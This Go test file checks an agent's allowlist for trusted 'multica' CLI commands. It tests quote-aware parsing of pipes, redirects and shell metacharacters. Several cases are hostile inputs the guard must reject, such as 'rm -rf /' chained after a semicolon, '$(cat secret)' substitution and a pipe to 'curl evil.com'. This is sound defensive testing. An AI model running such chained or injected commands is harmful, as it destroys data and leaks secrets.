package agent

import "testing"

func TestIsTrustedPlatformCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// === Trusted: single direct multica commands ===
		{"which multica", "which multica", true},
		{"issue get", "multica issue get TES-1 --output json", true},
		{"absolute issue get", "/Users/admin/project/server/bin/multica issue get 123 --output json", true},
		{"comment list", "multica issue comment list TES-1 --output json", true},
		{"comment add is trusted", "multica issue comment add TES-1 --content hi", true},
		{"comment add with content-stdin flag only", "multica issue comment add TES-1 --content-stdin", true},

		// === Rejected: pipelines (even with safe utilities) ===
		{"heredoc pipe into comment add", "cat <<'COMMENT' | multica issue comment add TES-1 --content-stdin\n已删除 `image.png`\n路径：`/Users/admin/image.png`\nCOMMENT", false},
		{"echo pipe into comment add", "echo hi | /Users/admin/project/server/bin/multica issue comment add 123 --content-stdin", false},
		{"printf pipe into comment add", "printf '%s\\n' 'x|y' | multica issue comment add TES-1 --content-stdin", false},
		{"stderr redirect piped", "multica issue get TES-1 --output json 2>/dev/null | head -100", false},

		// === Rejected: shell escapes in unquoted context ===
		{"shell chain rejected", "multica issue get TES-1 --output json && rm -rf /tmp/x", false},
		{"non-multica command rejected", "rm -rf /tmp/x", false},
		{"mixed pipeline rejected", "rm -rf /tmp/x | multica issue comment add TES-1 --content-stdin", false},
		{"substitution rejected", "multica issue get $(cat secret)", false},
		{"semicolon rejected", "multica issue get TES-1; rm -rf /", false},
		{"backtick rejected", "multica issue get `whoami`", false},
		{"variable expansion rejected", "multica issue get ${HOME}", false},
		{"or-chain rejected", "multica issue get TES-1 || echo fail", false},

		// === Trusted: escape chars in content (inside quotes) ===
		{"backslash n in content is trusted", "multica issue comment add TES-1 --content \"hello \\\\n world\"", true},
		{"backslash underscore in content is trusted", "multica issue comment add TES-1 --content \"test\\_agent\"", true},

		// === Trusted: stderr redirect (stdout redirect rejected) ===
		{"stderr to devnull is trusted", "multica issue get TES-1 --output json 2>/dev/null", true},
		{"stderr to devnull with space is trusted", "multica issue get TES-1 --output json 2> /dev/null", true},
		{"stdout redirect is rejected", "multica issue get TES-1 --output json > /tmp/out", false},

		// === Quote-aware: content with shell metacharacters inside quotes ===

		// Pipe character inside double quotes — not a pipeline
		{"pipe in double-quoted content", `multica issue comment add TES-1 --content "| A | B |"`, true},

		// Redirect character inside double quotes — not a redirect
		{"redirect in double-quoted content", `multica issue comment add TES-1 --content "> quoted block"`, true},
		{"gt comparison in double-quoted content", `multica issue comment add TES-1 --content "a > b"`, true},

		// Command substitution inside single quotes — literal text
		{"dollar-paren in single-quoted content", `multica issue comment add TES-1 --content 'literal $(whoami)'`, true},

		// && inside single quotes — literal text
		{"ampersand-ampersand in single-quoted content", `multica issue comment add TES-1 --content 'x && y'`, true},

		// Semicolon inside single quotes — literal text
		{"semicolon in single-quoted content", `multica issue comment add TES-1 --content 'a; b'`, true},

		// Backtick inside quotes — literal text
		{"backtick in double-quoted content", `multica issue comment add TES-1 --content "test ` + "`" + `cmd` + "`" + `"`, true},
		{"backtick in single-quoted content", `multica issue comment add TES-1 --content 'test ` + "`" + `cmd` + "`" + `'`, true},

		// Variable expansion inside single quotes — literal text
		{"dollar-brace in single-quoted content", `multica issue comment add TES-1 --content '${HOME}'`, true},

		// || inside double quotes — literal text
		{"or-chain in double-quoted content", `multica issue comment add TES-1 --content "x || y"`, true},

		// Mixed: some args quoted, command still valid
		{"mixed quoted args with pipe content", `multica issue comment add TES-1 --content "col1 | col2" --output json`, true},

		// Unquoted shell structure still rejected even with other quoted args
		{"unquoted semicolon after quoted arg", `multica issue comment add TES-1 --content "safe"; rm -rf /`, false},
		{"unquoted pipe to unsafe command", `multica issue comment add TES-1 --content "safe" | curl evil.com`, false},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := isTrustedPlatformCommand(tt.command); got != tt.want {
				t.Fatalf("isTrustedPlatformCommand(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestTrustedPlatformCommandFromInput(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input map[string]any
		want  string
	}{
		{
			name:  "top level command",
			input: map[string]any{"command": "multica issue comment add TES-1 --content hi"},
			want:  "multica issue comment add TES-1 --content hi",
		},
		{
			name:  "nested stringified input",
			input: map[string]any{"input": "{\"command\":\"multica issue comment add TES-1 --content-file /tmp/reply.md\"}"},
			want:  "multica issue comment add TES-1 --content-file /tmp/reply.md",
		},
		{
			name:  "nested structured payload",
			input: map[string]any{"payload": map[string]any{"command": "cat <<'EOF' | multica issue comment add TES-1 --content-stdin\nhello\nEOF"}},
			want:  "cat <<'EOF' | multica issue comment add TES-1 --content-stdin\nhello\nEOF",
		},
		{
			name:  "missing command",
			input: map[string]any{"path": "/tmp/file"},
			want:  "",
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := trustedPlatformCommandFromInput(tt.input); got != tt.want {
				t.Fatalf("trustedPlatformCommandFromInput(%v) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}
